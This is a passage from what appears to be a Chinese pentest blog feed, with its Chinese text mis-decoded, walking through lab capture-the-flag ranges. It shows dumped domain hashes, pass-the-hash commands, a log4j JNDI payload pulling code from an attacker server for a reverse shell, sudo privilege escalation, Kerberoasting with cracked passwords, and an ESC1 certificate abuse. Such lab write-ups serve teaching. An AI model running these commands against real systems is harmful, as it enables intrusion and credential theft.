class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;XIAORANG-WIN16.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  b8fa79a52e918cb0cbcd1c0ede492647        514</span><br><span class="line">1137    HealthMailboxeda7a84    1e89e23e265bb7b54dc87938b1b1a131        66048</span><br><span class="line">1138    HealthMailbox33b01cf    0eff3de35019c2ee10b68f48941ac50d        66048</span><br><span class="line">1139    HealthMailbox9570292    e434c7db0f0a09de83f3d7df25ec2d2f        66048</span><br><span class="line">1140    HealthMailbox3479a75    c43965ecaa92be22c918e2604e7fbea0        66048</span><br><span class="line">1141    HealthMailbox2d45c5b    4822b67394d6d93980f8e681c452be21        66048</span><br><span class="line">1142    HealthMailboxec2d542    147734fa059848c67553dc663782e899        66048</span><br><span class="line">1143    HealthMailboxf5f7dbd    e7e4f69b43b92fb37d8e9b20848e6b66        66048</span><br><span class="line">1144    HealthMailbox67dc103    4fe68d094e3e797cfc4097e5cca772eb        66048</span><br><span class="line">1145    HealthMailbox320fc73    0c3d5e9fa0b8e7a830fcf5acaebe2102        66048</span><br><span class="line">1146    Lumia   862976f8b23c13529c2fb1428e710296        512</span><br><span class="line">500     Administrator   7acbc09a6c0efd81bfa7d5a1d4238beb        512</span><br><span class="line">1000    XIAORANG-WIN16$ df9b69b6e7d4650b550889707f300328        532480</span><br><span class="line">1147    Zhangtong       22c7f81993e96ac83ac2f3f1903de8b4        512</span><br><span class="line">1103    XIAORANG-EXC01$ b898bfd97adaeac3165e21cc0c83e018        4096</span><br><span class="line">1104    XIAORANG-PC$    f3eb6c285c7a2b18307e3d0d1dc8bb21        4096</span><br><span class="line">1135    HealthMailbox8446c5b    40a4296ffa0b58bb805c36d8d3319df6        66048</span><br><span class="line">1136    HealthMailbox0d5918e    1e77e24cd23a786e6ae182ae2536dcb3        66048</span><br></pre></td></tr></table></figure><p>æ¨ªå‘DC</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.2 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> <span class="name">C</span>:\users\administrator\flag\flag.txt</span><br></pre></td></tr></table></figure><h2 id="flag04">flag04</h2><p>æ¨ªå‘26ï¼ŒLumiaç”¨æˆ·æ¡Œé¢æœ‰ä¸ªsecret.zip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.26 -codec gbk</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ä¸Šé¢dumpçš„å“ˆå¸Œä¸‹è½½outlookä¸­çš„é‚®ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pthexchange.py --target https://172.22.3.9 --username Lumia --password <span class="string">&quot;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296&quot;</span> --action Download</span><br></pre></td></tr></table></figure><p>è·å–çš„é‚®ä»¶é‡Œé¢æœ‰ä¸€ä¸ªè¡¨æ ¼ï¼Œé‡Œé¢æœ‰ä¸€å †æ‰‹æœºå·ï¼Œä½¿ç”¨æ‰‹æœºå·çˆ†ç ´å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john secret.zip &gt;zip.txt</span><br><span class="line">john --wordlist=1.txt zip.txt</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820214635822.png" alt="image-20240820214635822"></p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Certify</title>
    <link href="https://bowuchuling.github.io/posts/chunqiuCertify.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiuCertify.html</id>
    <published>2024-08-20T15:18:15.522Z</published>
    <updated>2024-08-20T15:34:58.161Z</updated>
    
    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Certify</h1><h2 id="flag01">flag01</h2><p>fscanæ‰«æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string">                     fscan version: 1.8.2</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 39.98.115.180   is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 1</span></span><br><span class="line"><span class="string">39.98.115.180:22 open</span></span><br><span class="line"><span class="string">39.98.115.180:80 open</span></span><br><span class="line"><span class="string">39.98.115.180:8983 open</span></span><br></pre></td></tr></table></figure><p>è®¿é—®39.98.115.180:8983å‘ç°æ˜¯solrç•Œé¢</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804013903746.png" alt="image-20240804013903746"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;jndi:rmi://ip:1099/7dbozo&#125;</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>æœç´¢å‘ç°solrçš„Ndayå­˜åœ¨log4jæ¼æ´ï¼Œå¯åŠ¨æ¶æ„æœåŠ¡å™¨åå¼¹shellï¼Œåœ¨core adminç•Œé¢å¡«å†™æ¶æ„payloadåadd coreå³å¯</p><p>æ‹¿åˆ°shellä¹‹åä¸Šçº¿åšä¸‹æŒä¹…åŒ–å¤„ç†ï¼Œå‘ç°å¹¶érootæƒé™ä¼°è®¡éœ€è¦ææƒï¼ŒæŸ¥çœ‹suidæƒé™å‘½ä»¤å‘ç°å¹¶æ²¡æœ‰å¯åˆ©ç”¨å‘½ä»¤ï¼Œsudo -læ‰§è¡Œåå‘ç°å¯ä»¥æ— å¯†ç æ‰§è¡Œgrcå‘½ä»¤</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804014202040.png" alt="image-20240804014202040"></p><p>å°è¯•ä½¿ç”¨grcè¿›è¡Œææƒ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804014510190.png" alt="image-20240804014510190"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grc --pty /bin/sh</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804014531690.png" alt="image-20240804014531690"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804014614048.png" alt="image-20240804014614048"></p><h2 id="flag02">flag02</h2><p>å†…ç½‘æ‰«æç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">172.22.9.19:80 open</span><br><span class="line">172.22.9.47:445 open</span><br><span class="line">172.22.9.26:445 open</span><br><span class="line">172.22.9.7:445 open</span><br><span class="line">172.22.9.26:139 open</span><br><span class="line">172.22.9.47:139 open</span><br><span class="line">172.22.9.26:135 open</span><br><span class="line">172.22.9.7:135 open</span><br><span class="line">172.22.9.7:80 open</span><br><span class="line">172.22.9.47:22 open</span><br><span class="line">172.22.9.19:22 open</span><br><span class="line">172.22.9.47:21 open</span><br><span class="line">172.22.9.47:80 open</span><br><span class="line">172.22.9.7:139 open</span><br><span class="line">172.22.9.7:88 open</span><br><span class="line">172.22.9.19:8983 open</span><br><span class="line">[*] NetBios: 172.22.9.7      [+]DC XIAORANG\XIAORANG-DC     </span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.9.26</span><br><span class="line">   [-&gt;]DESKTOP-CBKTVMO</span><br><span class="line">   [-&gt;]172.22.9.26</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.9.7</span><br><span class="line">   [-&gt;]XIAORANG-DC</span><br><span class="line">   [-&gt;]172.22.9.7</span><br><span class="line">[*] WebTitle: http://172.22.9.19        code:200 len:612    title:Welcome to nginx!</span><br><span class="line">[*] WebTitle: http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] NetBios: 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] NetBios: 172.22.9.47     fileserver                          Windows 6.1 </span><br><span class="line">[*] 172.22.9.47  (Windows 6.1)</span><br><span class="line">[*] WebTitle: http://172.22.9.19:8983   code:302 len:0      title:None è·³è½¬url: http://172.22.9.19:8983/solr/</span><br><span class="line">[*] WebTitle: http://172.22.9.7         code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle: http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin</span><br><span class="line">[+] http://172.22.9.7 poc-yaml-active-directory-certsrv-detect </span><br></pre></td></tr></table></figure><p>å­˜åœ¨ä¸€ä¸ªæ³„éœ²æ¼æ´ï¼Œçœ‹äº†ä¸‹pocæ„Ÿè§‰åƒæ˜¯è¯¯æŠ¥ï¼ŒæŠŠå¼€æ”¾çš„ç«™å¤§è‡´çœ‹äº†çœ‹æ²¡ä»€ä¹ˆèƒ½æ‰“çš„ï¼Œå‘ç°å­˜åœ¨æ–‡ä»¶æœåŠ¡å™¨ï¼Œä½¿ç”¨nmapè¿›ä¸€æ­¥æ‰«æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Host script results:</span><br><span class="line">| smb2-time:</span><br><span class="line">|   <span class="built_in">date</span>: 2024-08-03T17:59:02</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: fileserver</span><br><span class="line">|   NetBIOS computer name: FILESERVER\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: fileserver</span><br><span class="line">|_  System time: 2024-08-04T01:59:06+08:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled but not required</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¾ç¤ºä½¿ç”¨äº†guestè´¦æˆ·è¿›è¡Œæ‰«æï¼Œå¯èƒ½å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ï¼Œä½¿ç”¨è„šæœ¬å°è¯•è¿æ¥</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804020628874.png" alt="image-20240804020628874"></p><p>å‘ç°ç¡®å®å­˜åœ¨æœªæˆæƒï¼Œåœ¨secretä¸‹æ‰¾åˆ°äº†flag02ï¼Œå¹¶ä¸”è·å–äº†personnel.dbæ–‡ä»¶</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804020810284.png" alt="image-20240804020810284"></p><h2 id="flag03">flag03</h2><p>è¿æ¥dbæ–‡ä»¶ï¼Œå‘ç°äº†ä¸€å †ç”¨æˆ·åå’Œå¯†ç ï¼Œå…ˆå°è¯•è¿›è¡Œä¸€æ³¢crackmapexecçˆ†ç ´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.9.1/24 -u user.txt -p pass.txt --continue-on-success 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå»ºè®®ä¸€ä¸ªä¸€ä¸ªçˆ†ï¼Œå› ä¸ºçˆ†åˆ°æ–‡ä»¶æœåŠ¡å™¨çš„æ—¶å€™ä¼šå…¨çˆ†æˆåŠŸï¼Œè¿·æƒ‘çš„å¾ˆ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804021347442.png" alt="image-20240804021347442"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804021401644.png" alt="image-20240804021401644"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\zhangjian:i9XDE02pLVf</span><br><span class="line">xiaorang.lab\liupeng:fiAzGwEMgTY</span><br></pre></td></tr></table></figure><p>å°è¯•rdpç™»å½•ï¼Œç»“æœå¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804021813734.png" alt="image-20240804021813734"></p><p>ä¸¤ä¸ªéƒ½æ˜¯è¿™æ ·çš„è¿”å›ç»“æœï¼Œæ ¹æ®flag02çš„æç¤ºï¼Œè¿™é‡Œåº”è¯¥è¦æŸ¥è¯¢SPNï¼Œè¿™é‡Œéœ€è¦å…ˆç®€å•æåŠå‡ ä¸ªæ¦‚å¿µ</p><h3 id="Kerberos">Kerberos</h3><p>åŸŸç¯å¢ƒä¸­éå¸¸å¸¸è§çš„èº«ä»½è®¤è¯åè®®ï¼Œè®¤è¯è¿‡ç¨‹ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804022155234.png" alt="image-20240804022155234"></p><ul><li>èº«ä»½éªŒè¯æœåŠ¡ (AS) äº¤æ¢ (KRB_AS_*ï¼‰</li><li>ç¥¨è¯æˆäºˆæœåŠ¡ (TGS) äº¤æ¢ (KRB_TGS_*ï¼‰</li><li>å®¢æˆ·ç«¯/æœåŠ¡å™¨ (AP) äº¤æ¢ (KRB_AP_*ï¼‰</li></ul><p>åœ¨è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨çš„æ˜¯TGSäº¤æ¢è¿‡ç¨‹ï¼Œè¿™é‡Œçš„ASå’ŒTGSæ˜¯KDCçš„ä¸¤ä¸ªç»„æˆéƒ¨åˆ†</p><h3 id="SPN">SPN</h3><p>æœåŠ¡ä¸»ä½“åç§°ï¼ˆSPNï¼šServicePrincipal Namesï¼‰æ˜¯æœåŠ¡å®ä¾‹çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚å¯ä»¥ç†è§£ä¸ºåŸŸå†…æœåŠ¡çš„èº«ä»½è¯ï¼Œæ¯ä¸ªæœåŠ¡éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„SPNï¼Œè€ŒæœåŠ¡åœ¨æ³¨å†ŒSPNçš„æ—¶å€™ä¼šå’Œè´¦å·è¿›è¡Œç»‘å®šï¼Œå› æ­¤SPNèµ·åˆ°äº†å°†æœåŠ¡å®ä¾‹ä¸æœåŠ¡ç™»å½•å¸æˆ·ç›¸å…³è”çš„ä½œç”¨ã€‚<strong>ä¸€ä¸ªSPNå¯¹åº”ä¸€ä¸ªè´¦æˆ·å’Œä¸€ä¸ªæœåŠ¡ï¼Œä½†ä¸€ä¸ªè´¦æˆ·å¯ä»¥å¯¹åº”å¤šä¸ªSPNå’ŒæœåŠ¡</strong></p><p>è¿™é‡Œæ¯”è¾ƒé‡è¦çš„æ˜¯ï¼Œä»»ä½•ä¸€ä¸ªåŸŸå†…è´¦æˆ·éƒ½å¯ä»¥å‘DCæŸ¥è¯¢æ‰€æœ‰åŸŸå†…ç”¨æˆ·å¯¹åº”çš„<strong>SPN</strong>å¹¶è¿›è¡Œ<strong>TGSäº¤æ¢</strong>è¿‡ç¨‹ï¼Œåœ¨<strong>KRB_TGS_REP</strong>è¿‡ç¨‹å°†ä¼šè¿”å›æŸ¥è¯¢åˆ°çš„ç”¨æˆ·çš„<strong>TGS tickets</strong>ï¼Œç„¶åæˆ‘ä»¬å³å¯ä½¿ç”¨çˆ†ç ´å·¥å…·å¯¹äºè¿”å›çš„ç¥¨æ®è¿›è¡Œçˆ†ç ´ï¼Œè·å–å¯¹åº”æ˜æ–‡ã€‚</p><h3 id="æŸ¥è¯¢ç»“æœå¦‚ä¸‹">æŸ¥è¯¢ç»“æœå¦‚ä¸‹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/liupeng:fiAzGwEMgTY 2&gt;/dev/null</span><br><span class="line">proxychains4 impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*zhangxia<span class="variable">$XIAORANG</span>.LAB<span class="variable">$xiaorang</span>.lab/zhangxia*$13288c81c67ba7897cac2231d7ac9cb5<span class="variable">$da825bd13667cca66080fbd097e26db11c13f5c3c654b6eb768d77dc174761bf91230aecd34133bc583ac5fa9e6d9011d576dc49296c9948408d5a30231af8bb47efea9b129bdee900c9dffb768eecb5c26b63d0f0dbf09360f0d7981856301beb0e41093dca962dd21813d4b9ae051579df75ebbb1e6a4ea3de0278ba25744d43db7399da8d273c7344626555598814513093fe8d8306ceaac6ff4989ac683b84ab54bc74d06b35efeb79ded926f409bd2be84b135f053242a568babf7903a55343a3ab42e453e3cecb431cc93390f9c143ea4830275c9b0e74e77ffbcf9dc44793f139cb501ed0f744c057d7fe5bde2c276350b1b1337cde3263b0307226cd3bcc3d0eebcc1928aaae1b7444ccc5324808d3e83bc227f9b09ce55c84247fa5227d6db3e32c3fccd362ca501c6b7d04835188c5db5c6df48b10206309ab8725c84ff23a1c61aa135b360db7b24db17ed5bfcd9f225283c317cee73bb954815f4f3c2fcbbb4a17c865b86535c34f8db9853937fb41508a633ba4af90aad065ab4455d27101b304d5cf672a00e12a44a13146ea9a9196c6833fda9a2cbe78ead58672c4680d7f720d3cdef8738f6c007d6f47a59d7f77acd70acb1492e0ef09faab42c54b3af487c31add18343e3ee7d2bd4c3f6d88cc271b397c195e07a4668723854190e7706e18875886be8d5af29a26ae010f2bcff9d3db3b53563f4f8c2efe7adc0a5a6a59017ece07f47a656e5de3fcb01eece1aa2c721e1d284615233056d56ea32c6dbd923b3ae6b6a609a2e0d1992d408c4703562e47af94be585ecb61140202c8cc42f6e14117026cdee449b0ac996f704b5dcdad4c20d1c346a600cced7422e499d8eabfca9c86903ee2d24f7f1392279dd90c6d5c22b8e53c90e367379cccc7f62c2107c8c5e56bb7148fd4d41bf7e63e2373f5ddc631ce73364404bee3324d4c3556951ca9e36fd15d7ff65b9352ae20a73a27a8c419ccc1281b884242ea6ecceea809d0502c9b598aefc0c3d5c798305b395ac23e9b0da9b9c74910c307428127fe9eeaeb8227e3a8f168000f33f9d5040e256b5b0374e3343aa8ef1e5d62e0433190723bc4c39ffce427194b0ef4380d11013a8d0ad5f196097f5200c0d7beb1ea98d8a13a36cfb2e89d63356860f6be81a7d05dc131d48149e54b07db82d1431d32a866e29a9463d90b170b8bee496767c892bbd81906d91dcd8534d99a8e4320cdbdc62a8673c158c452c178e55bb680fdb37b721da5d65d78e4705280a167f39b1c81fc6d9660244fa96293cc4285189333fb82fa5d3b3dfa7ebc57a50a99507a526cf678fb7205e930d547d780ebf63b6d7ac0c5e553f8bdf1d7efb497d3779060c865c4bc955131eb242e0efb2e804a215305041bb07fd832109d9e55f1b6043730412fc1e68c929afb58d7a6ff0df472f669659d9193d31ceac7ed3dd3341a7ab816d088dc84001a3f7c660bfa10f8d9fbefee03dc9a07f0e7d64bf88e1f7e0a51c82b6c</span></span><br><span class="line">$krb5tgs$23$*chenchen<span class="variable">$XIAORANG</span>.LAB<span class="variable">$xiaorang</span>.lab/chenchen*$5199d92f23d1475890b372e8a7b0540d<span class="variable">$c4a300433edcea30edef3ef53e42e32effa1de63b3edc3555f35b0f6d46c039758ab09c2c51ebeacfa7cb83c744e46b6eeaf45a7b7937aedaa8ed46c5e224235c953fd152f33d9def1a566cc00beee0dd5a83bf937a28aca2a025e56d7243b83cb51c73c526ba69917764d1c4a775c86e27ce16bf733a8a0ae31d7c32fdf33c99d89dc34ebcc20498ef6d59472a34fd76e5fed48b188a3968a6d8a3ec4fa7ba0e3ca773082df24ca022dc4d2c1c055d05dc429c8448dc5a55a466f739ab394596527b336eff8fe8dd5a6712b09e116a0718ca6392e3ccdb2eef1732f4f27f6da4b90c9030418e2249b2c5f8dfd08335a94c552927a77d85d2c8e6c67550900ba7dcf40a8dc03f3e28389d0b399133816e66774a6ac6ce6f09fec09d117528188e96e4ff589cf183416aa3aa8c16f0211459946e9ed2d29ea39f68fbd6dc7989263f382561399417fcfa5ea254b8a973538399a11cef5fada4455ac0557c97033cf9a68776f08db2ebbbf7e7f1c32aebc9ac1c5489db62b80a3f2b10b214bae79ff9e489df1726812f46e5e8a0234d1a58fb17a032c94b3911e161cb83b53bbd9d7262604a7fd0c48d0123239f53a35c87c40b8660d017fbaccc4e8745653d3e113d04441997fc46646382074ecb3a02cc6d89b9a7da3fe2691433fba2a99b59b10d4479f4f038b1bec110595327a50470b0eb86d50dc84b8a61748e6532a55a39f0ee71f654e2ec441588b7bcde70c6b2618bc52ff480e57e55dca6afe9abfe244808fe261ee4b43fc8a43e23f140b8ac63000a7b576eabea681cc67b3771e60b08bda02ba737e9fa7e661ef46df685030e6b8ad5a4597d5e6a17fbf8fcdbbcf3df461cdb654a98bb2d0775036e99bd051550704c9463bed660025a59fc53341c466349f113e159237d4952c7b84025321e7217f9d6c761eed3fa4937f17492d3d6c4fb45b4924ebb900ff00f32f76e22839441020aa65f405638b82edd7f8ca65b92548c79a742fcb2facd86b96a6d8019cbbc138fa0a7ff9196c228354aefcf6dce54ad453f346e93329544f2bb62a0cc29dbb7bfc447426127f14fa54fab85134ef4d47802b1be6ee26a7df056e6521f0c067ec759022ee5fc37e7ed430ee12535697980a2b5963f016c68bbaa58fddfd3c9eef8f4349c33561da679cb9b704b3d5a865d9190b152c0861635203f6565a655c1ae6de9eb69b89ce9742c04f318dacb888da6c31a1febc151bba96c4dc93212338ca3b02a1afdeb696725bce59ac7419074d8ae069a1beb48ff1c1851770d461b2277e322456865c7baedf7e723c3815a30230f6886b454cda13f3bfb2e2e52d856a670124f65f379146afe69ce88f02a1ac8c1e24c826971621fe0a5cb8e38574229a8b4603cf7ff1cf95f06cf6f91821528ac0a7881a47e5288b1c108bf0df297d5757de745abdc6c4de655fb4abbf3c59747077d5d862152faf7dd0001695196c0d03d168cf0deda63b43eb64099d454519ef62954a1aa22b</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 13100 hash.txt ./rockyou.txt</span><br></pre></td></tr></table></figure><p>çˆ†ç ´å‡ºæ¥ä¸¤ä¸ªå¯†ç </p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804024453822.png" alt="image-20240804024453822"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\zhangxia MyPass2@@6</span><br><span class="line">xiaorang.lab\chenchen @Passw0rd@</span><br></pre></td></tr></table></figure><p>rdpç™»å½•æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰æƒé™è¯»flagï¼Œç”±äºå­˜åœ¨CAè®¤è¯æœåŠ¡å™¨ç»“åˆé¢˜ç›®åï¼Œå°è¯•æŸ¥çœ‹æ˜¯å¦å­˜åœ¨é”™è¯¯é…ç½®çš„è¯ä¹¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find /vulnerable</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240804030255241.png" alt="image-20240804030255241"></p><p>é‡ç‚¹æŸ¥çœ‹è¿™ä¸‰ä¸ªå±æ€§æ˜¯å¦ç¬¦åˆæ¼æ´ï¼ˆESC1ï¼‰æ¡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msPKI-Certificate-Name-Flag:ENROLLEE_SUPPLIES_SUBJECT</span><br><span class="line"></span><br><span class="line">mspki-certificate-application-policy:å®¢æˆ·ç«¯èº«ä»½éªŒè¯</span><br><span class="line"></span><br><span class="line">Enrollment Rights:XIAORANG\Domain Users</span><br></pre></td></tr></table></figure><p>å®Œå…¨å»åˆï¼Œgoodï¼Œæ‰“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe request /ca:XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA /template:<span class="string">&quot;XR Manager&quot;</span> /altname:administrator</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 